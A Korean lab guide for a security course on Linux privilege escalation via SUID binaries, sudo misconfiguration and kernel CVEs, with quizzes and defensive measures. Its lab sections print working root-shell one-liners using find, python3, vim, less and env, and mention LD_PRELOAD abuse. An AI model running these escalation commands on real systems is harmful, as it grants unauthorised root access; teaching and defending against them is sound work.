# Week 05: 권한 상승 — SUID, sudo, 커널 익스플로잇

## 학습 목표
- 리눅스 권한 상승의 개념과 공격 경로를 이해한다
- SUID 비트가 설정된 바이너리를 찾아 악용할 수 있다
- sudo 설정 오류를 이용한 권한 상승 기법을 실습한다
- 커널 익스플로잇의 원리를 이해하고 탐지 방법을 학습한다

## 선수 지식
- 리눅스 파일 권한 체계 (rwx, owner/group/other)
- 프로세스 실행 권한 (UID, EUID)
- 기본 셸 명령어 사용 능력

## 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:30 | 권한 상승 이론 | 강의 |
| 0:30-0:50 | SUID/sudo/커널 공격 벡터 | 강의 |
| 0:50-1:00 | 휴식 | - |
| 1:00-1:40 | SUID 바이너리 탐색 및 악용 실습 | 실습 |
| 1:40-2:20 | sudo 설정 오류 악용 실습 | 실습 |
| 2:20-2:30 | 휴식 | - |
| 2:30-3:10 | 커널 익스플로잇 분석 + 방어 실습 | 실습 |
| 3:10-3:40 | 방어 전략 토론 + 퀴즈 | 토론/퀴즈 |

---

# Part 1: 권한 상승 이론 (30분)

## 1.1 권한 상승이란?

권한 상승(Privilege Escalation)은 일반 사용자 권한에서 root 또는 상위 권한을 획득하는 과정이다. MITRE ATT&CK에서 **TA0004 (Privilege Escalation)** 전술에 해당한다.

### 권한 상승 유형

| 유형 | 설명 | 예시 |
|------|------|------|
| **수직 상승** | 낮은 권한 → 높은 권한 | 일반 사용자 → root |
| **수평 이동** | 같은 레벨의 다른 계정 | user1 → user2 |

### 리눅스 권한 상승 공격 벡터

```
권한 상승 경로
├── SUID/SGID 바이너리 악용
├── sudo 설정 오류
├── 커널 익스플로잇
├── cron job 악용
├── 환경 변수 조작 (PATH hijacking)
├── NFS root_squash 미설정
├── Docker 그룹 소속 악용
└── 쓰기 가능한 서비스 설정 파일
```

## 1.2 SUID 비트

SUID(Set User ID) 비트가 설정된 실행 파일은 **파일 소유자의 권한**으로 실행된다.

```bash
# 일반 실행: user 권한으로 실행
$ whoami → user

# SUID 바이너리 실행: 파일 소유자(root) 권한으로 실행
$ /usr/bin/passwd → root 권한으로 /etc/shadow 수정
```

정상적인 SUID 바이너리: `passwd`, `ping`, `su`, `mount`
위험한 SUID 바이너리: `find`, `vim`, `python`, `bash`, `nmap`

## 1.3 sudo 설정

`/etc/sudoers` 파일은 어떤 사용자가 어떤 명령을 root로 실행할 수 있는지 정의한다.

```
# 안전한 설정
user ALL=(ALL) /usr/bin/systemctl restart nginx

# 위험한 설정 (악용 가능)
user ALL=(ALL) NOPASSWD: /usr/bin/vim
user ALL=(ALL) NOPASSWD: /usr/bin/find
user ALL=(ALL) NOPASSWD: ALL
```

---

# Part 2: 실습 가이드

## 실습 2.1: SUID 바이너리 탐색 및 악용

> **목적**: SUID 비트가 설정된 바이너리를 찾아 권한 상승을 시도한다
> **배우는 것**: SUID 바이너리 검색, GTFOBins 활용

```bash
# SUID 바이너리 전체 탐색
find / -perm -4000 -type f 2>/dev/null

# SGID 바이너리 탐색
find / -perm -2000 -type f 2>/dev/null

# 결과에서 비정상적인 SUID 바이너리 식별
# 정상: /usr/bin/passwd, /usr/bin/su, /usr/bin/mount
# 의심: /usr/bin/find, /usr/bin/python3, /usr/bin/vim

# GTFOBins 참조하여 악용
# find로 권한 상승
find . -exec /bin/sh -p \; -quit

# python3으로 권한 상승
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# vim으로 권한 상승
vim -c ':!/bin/sh'
```

> **결과 해석**: `-p` 옵션은 셸이 EUID를 유지하도록 한다. `whoami`로 root 확인이 되면 권한 상승에 성공한 것이다.
> **실전 활용**: 공방전에서 초기 접근 후 가장 먼저 SUID 바이너리를 탐색한다.

## 실습 2.2: sudo 설정 오류 악용

> **목적**: sudo 설정의 취약점을 찾아 권한 상승을 수행한다
> **배우는 것**: sudoers 분석, sudo를 통한 셸 획득

```bash
# 현재 사용자의 sudo 권한 확인
sudo -l

# sudo vim으로 root 셸 획득
sudo vim -c ':!/bin/bash'

# sudo find로 root 셸 획득
sudo find /tmp -exec /bin/bash \; -quit

# sudo less로 root 셸 획득
sudo less /etc/hosts
# less 내에서 !/bin/bash 입력

# sudo env로 PATH 조작
sudo env /bin/bash

# LD_PRELOAD 악용 (NOPASSWD + env_keep 설정 시)
# 악성 공유 라이브러리를 만들어 root로 로드
```

> **결과 해석**: `sudo -l` 출력에서 NOPASSWD로 실행 가능한 바이너리가 셸 탈출을 지원하면 권한 상승이 가능하다.

## 실습 2.3: 커널 익스플로잇 분석 및 방어

> **목적**: 커널 버전 기반 취약점 확인과 방어 방법을 학습한다
> **배우는 것**: 커널 버전 확인, 패치 상태 점검

```bash
# 커널 버전 확인
uname -a
uname -r

# OS 정보 확인
cat /etc/os-release

# 알려진 커널 취약점 확인 (예시)
# CVE-2021-4034 (PwnKit): polkit pkexec
# CVE-2022-0847 (Dirty Pipe): 커널 5.8~5.16
# CVE-2021-3156 (Baron Samedit): sudo 1.8.2~1.9.5p1

# sudo 버전 확인 (Baron Samedit 취약 여부)
sudo --version

# 패키지 업데이트 상태 확인
apt list --upgradable 2>/dev/null | head -20

# 커널 보안 설정 확인
sysctl kernel.randomize_va_space
sysctl kernel.dmesg_restrict
```

> **결과 해석**: 커널 버전이 알려진 취약점 범위에 해당하면 익스플로잇이 가능할 수 있다. 보안 패치 적용 여부를 반드시 확인한다.

---

# Part 3: 심화 학습

## 3.1 자동화 열거 도구

수동 탐색 외에 자동화 도구를 활용하면 효율적이다.

- **LinPEAS**: 리눅스 권한 상승 경로 자동 탐색
- **LinEnum**: 시스템 정보 수집 및 취약점 식별
- **pspy**: 프로세스 모니터링 (cron job 탐지)

## 3.2 방어 전략

- 불필요한 SUID 비트 제거: `chmod u-s /usr/bin/find`
- sudoers 최소 권한 원칙 적용
- 커널 및 패키지 정기 패치
- AppArmor/SELinux 프로필 적용

---

## 검증 체크리스트
- [ ] SUID 바이너리를 탐색하여 비정상적인 항목을 식별했는가
- [ ] sudo -l 결과를 분석하여 악용 가능한 설정을 찾았는가
- [ ] 최소 1가지 방법으로 root 권한을 획득했는가
- [ ] 방어 조치(SUID 제거, sudoers 수정)를 수행했는가

## 자가 점검 퀴즈
1. SUID 비트가 설정된 파일의 권한 표시에서 `s`가 나타나는 위치는 어디인가?
2. `sudo -l` 출력에서 `(ALL) NOPASSWD: /usr/bin/vim`이 위험한 이유는?
3. GTFOBins 사이트의 용도와 활용 방법을 설명하라.
4. Dirty Pipe(CVE-2022-0847) 취약점의 영향을 받는 커널 버전 범위는?
5. 권한 상승 방어를 위한 최소 권한 원칙의 구체적 적용 사례 3가지를 제시하라.
